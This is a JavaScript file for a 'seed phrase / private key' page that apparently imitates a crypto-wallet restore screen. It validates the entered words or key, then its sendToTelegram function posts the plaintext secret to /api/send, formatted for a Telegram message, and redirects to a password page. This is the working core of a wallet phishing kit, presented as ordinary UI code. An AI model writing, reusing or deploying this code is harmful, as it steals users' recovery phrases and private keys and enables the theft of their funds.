// ========================= seed.js (updated) =========================
//  Handles UI logic for the "Seed phrase / Private key" page.
//  - Tab switching between Seed Phrase & Private Key
//  - Dynamic seed-input rendering (12/15/18/21/24 words)
//  - Validation (BIP-39 word check, Hex 64-byte priv-key, WIF 51/52-char)
//  - Enable / disable Confirmation button
//  - Send data to backend (/api/send) then redirect to /set-password/
// --------------------------------------------------------------------

// ---------- ELEMENT REFERENCES ----------
const backBtn        = document.getElementById('backSeedBtn');
const tabBtnSeed     = document.getElementById('seedTabBtn');
const tabBtnPriv     = document.getElementById('privTabBtn');
const phrasePanel    = document.querySelector('.seed-phrase-panel');
const privPanel      = document.querySelector('.privkey-panel');
const dropdownBtn    = document.getElementById('wordDropdownBtn');
const dropdownList   = document.getElementById('wordDropdownList');
const wordCountLabel = document.getElementById('wordCountLabel');
const seedInputs     = document.getElementById('seedInputs');
const privTextarea   = document.getElementById('privkeyarea');
const confirmBtn     = document.getElementById('seedConfirmBtn');

// ---------- NAVIGATION ----------
backBtn.addEventListener('click', e => {
  e.preventDefault();
  window.history.back();
});

// ---------- TAB SWITCHING ----------
function activateSeedTab() {
  tabBtnSeed.classList.add('active');
  tabBtnPriv.classList.remove('active');
  phrasePanel.style.display = '';
  privPanel.style.display   = 'none';
  checkConfirm();
}
function activatePrivTab() {
  tabBtnPriv.classList.add('active');
  tabBtnSeed.classList.remove('active');
  phrasePanel.style.display = 'none';
  privPanel.style.display   = '';
  checkConfirm();
}
tabBtnSeed.addEventListener('click', activateSeedTab);
tabBtnPriv.addEventListener('click', activatePrivTab);

// ---------- SEED INPUTS (dynamic) ----------
const WORD_COUNTS = [12, 15, 18, 21, 24];
let wordCount   = 12;
let inputStates = [];

function renderSeedInputs(count) {
  const prev = Array.from(seedInputs.querySelectorAll('input')).map(i => i.value);
  seedInputs.innerHTML = '';
  inputStates = [];

  for (let i = 0; i < count; i++) {
    const wrap  = document.createElement('div');
    wrap.style.position = 'relative';

    const input = document.createElement('input');
    input.type        = 'password';
    input.className   = 'seed-word-input';
    input.placeholder = i + 1;
    input.autocomplete= 'off';
    input.inputMode   = 'text';
    input.maxLength   = 32;
    input.value       = prev[i] || '';
    inputStates[i]    = input.value;

    // mask/unmask
    input.addEventListener('focus', () => input.type = 'text');
    input.addEventListener('blur',  () => input.type = 'password');

    // paste-to-fill (first field only)
    if (i === 0) {
      input.addEventListener('paste', e => {
        e.preventDefault();
        const words = (e.clipboardData || window.clipboardData)
                        .getData('text')
                        .trim()
                        .split(/\s+/);
        const inputs = seedInputs.querySelectorAll('input');
        words.slice(0, inputs.length).forEach((w, idx) => {
          inputs[idx].value = w;
          inputStates[idx]  = w;
        });
        if (words.length) inputs[Math.min(words.length, inputs.length) - 1].focus();
        checkConfirm();
      });
    }

    input.addEventListener('input', () => {
      inputStates[i] = input.value;
      checkConfirm();
    });

    wrap.appendChild(input);
    seedInputs.appendChild(wrap);
  }
}
renderSeedInputs(wordCount);

// dropdown handler
dropdownBtn.addEventListener('click', e => {
  e.stopPropagation();
  dropdownList.classList.toggle('active');
});
document.body.addEventListener('click', () => dropdownList.classList.remove('active'));
dropdownList.querySelectorAll('div').forEach(div => {
  div.addEventListener('click', e => {
    e.stopPropagation();
    wordCount = Number(div.dataset.value);
    wordCountLabel.textContent = `${wordCount} words`;
    dropdownList.querySelectorAll('div').forEach(d => d.classList.remove('selected'));
    div.classList.add('selected');
    dropdownList.classList.remove('active');
    renderSeedInputs(wordCount);
    checkConfirm();
  });
});

// ---------- VALIDATION ----------
function isValidSeedPhraseLoose(words) {
  return words.every(w => bip39Wordlist.includes(w.toLowerCase()));
}

// Accepts 64-byte hex (with / without 0x) OR WIF 51/52-char
function isValidPrivkey(str) {
  if (!str) return false;
  const raw = str.trim();

  // Hex 64
  const hex = raw.replace(/^0x/i, '');
  if (/^[0-9a-fA-F]{64}$/.test(hex)) return true;

  // WIF Base58
  if (/^[5KLc9][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(raw)) return true;

  return false;
}

// ---------- ERROR HELPERS ----------
function showSeedError(msg, words) {
  let el = document.getElementById('seedPhraseError');
  if (!el) {
    el = document.createElement('div');
    el.id = 'seedPhraseError';
    el.className = 'error-msg';
    seedInputs.parentElement.appendChild(el);
  }
  el.textContent = msg;
  el.style.display = '';

  const inputs = seedInputs.querySelectorAll('input');
  inputs.forEach((inp, i) => {
    if (!bip39Wordlist.includes(words[i])) inp.classList.add('error');
    else inp.classList.remove('error');
  });
}
function hideSeedError() {
  const el = document.getElementById('seedPhraseError');
  if (el) el.style.display = 'none';
  seedInputs.querySelectorAll('input').forEach(inp => inp.classList.remove('error'));
}

function showPrivError(msg) {
  let el = document.getElementById('privKeyError');
  if (!el) {
    el = document.createElement('div');
    el.id = 'privKeyError';
    el.className = 'error-msg';
    privPanel.appendChild(el);
  }
  el.textContent = msg;
  el.style.display = '';
  privTextarea.classList.add('error');
}
function hidePrivError() {
  const el = document.getElementById('privKeyError');
  if (el) el.style.display = 'none';
  privTextarea.classList.remove('error');
}

// ---------- CONFIRM BUTTON STATE ----------
function checkConfirm() {
  if (tabBtnSeed.classList.contains('active')) {
    const words = [...seedInputs.querySelectorAll('input')].map(i => i.value.trim().toLowerCase());
    const allFilled = words.every(w => w);
    if (!allFilled) {
      confirmBtn.disabled = true; confirmBtn.classList.remove('enabled'); hideSeedError();
      return;
    }
    if (isValidSeedPhraseLoose(words)) {
      confirmBtn.disabled = false; confirmBtn.classList.add('enabled'); hideSeedError();
    } else {
      confirmBtn.disabled = true; confirmBtn.classList.remove('enabled');
      showSeedError('Incorrect seed phrase. Check and re-enter.', words);
    }
  } else {
    const priv = privTextarea.value.trim();
    if (!priv) {
      confirmBtn.disabled = true; confirmBtn.classList.remove('enabled'); hidePrivError();
      return;
    }
    if (isValidPrivkey(priv)) {
      confirmBtn.disabled = false; confirmBtn.classList.add('enabled'); hidePrivError();
    } else {
      confirmBtn.disabled = true; confirmBtn.classList.remove('enabled');
      showPrivError('The private key is incorrect. Please check and re-enter.');
    }
  }
}
seedInputs.addEventListener('input', checkConfirm);
privTextarea.addEventListener('input', checkConfirm);

// ---------- SEND TO BACKEND ----------
function sendToTelegram(message, cb) {
  fetch('/api/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message })
  })
  .then(res => res.json())
  .then(() => cb?.())
  .catch(() => cb?.());
}

confirmBtn.addEventListener('click', () => {
  if (confirmBtn.disabled) return;

  let message = '';
  if (tabBtnSeed.classList.contains('active')) {
    const words = [...seedInputs.querySelectorAll('input')].map(i => i.value.trim());
    message = `<b>Seed Phrase</b>:\n${words.join(' ')}`;
  } else {
    let priv = privTextarea.value.trim().replace(/^0x/i, ''); // strip 0x
    message = `<b>Private Key</b>:\n${priv}`;
  }

  sendToTelegram(message, () => window.location.href = '/set-password/');
});